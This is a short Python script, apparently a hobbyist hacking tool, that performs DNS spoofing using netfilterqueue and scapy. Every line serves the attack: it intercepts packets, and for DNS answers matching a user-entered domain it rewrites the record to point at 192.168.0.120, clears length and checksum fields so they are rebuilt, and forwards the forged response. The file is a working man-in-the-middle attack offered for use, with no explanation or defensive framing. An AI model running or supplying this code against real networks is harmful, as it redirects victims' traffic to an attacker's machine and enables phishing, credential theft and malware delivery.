#!/usr/bin/env python3

import subprocess as sub_proc
import netfilterqueue
import scapy.all as scapy

sub_proc.call("clear", shell=True)
sub_proc.call("figlet DNS spoof | lolcat", shell=True)
target = input("[ ] Target link: ")

scapy.conf.use_pcap = True
scapy.conf
scapy.conf.iface

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if target in str(qname):
            print("[+] Spoofing " + str(qname))

            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.120")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
